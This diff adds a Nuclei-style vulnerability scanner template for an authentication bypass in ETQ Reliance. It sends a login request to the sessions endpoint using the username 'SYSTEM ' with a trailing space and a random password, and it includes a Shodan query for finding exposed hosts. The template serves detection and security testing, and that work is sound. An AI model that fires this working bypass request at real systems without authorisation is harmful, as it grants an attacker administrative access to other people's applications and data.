@@ -1,0 +1,42 @@
+id: etq-reliance-auth-bypass
+
+info:
+  name: ETQ Reliance - Authentication Bypass
+  author: assetnote,DhiyaneshDK
+  severity: critical
+  description: |
+    An authentication bypass vulnerability exists in ETQ Reliance's login mechanism, where submitting the SYSTEM username followed by a trailing space ("SYSTEM ") allows unauthenticated users to gain full access as the SYSTEM account. This critical flaw effectively bypasses authentication controls and grants administrative-level access to the application.
+  reference:
+    - https://slcyber.io/assetnote-security-research-center/how-we-accidentally-discovered-a-remote-code-execution-vulnerability-in-etq-reliance/
+  metadata:
+    max-request: 1
+    shodan-query: html:"ETQ Reliance"
+  tags: etq-reliance,auth-bypass
+
+variables:
+  username: "SYSTEM "
+  password: "{{to_lower(rand_text_alphanumeric(7))}}"
+
+http:
+  - raw:
+      - |
+        POST /reliance/resources/sessions HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+
+        {"username":"{{username}}","password":"{{password}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "statusCode"
+          - "userId"
+        condition: and
+
+      - type: word
+        part: content_type
+        words:
+          - "application/json"
